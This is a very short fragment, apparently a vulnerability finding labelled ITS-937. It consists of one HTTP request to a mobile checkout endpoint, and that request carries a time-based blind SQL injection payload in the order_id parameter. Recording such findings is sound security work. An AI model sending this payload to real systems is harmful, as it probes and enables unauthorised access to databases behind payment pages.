# Vulnerable: ITS-937
GET /mobile-checkout/?order_id=(select*from(select(sleep(6)))a)
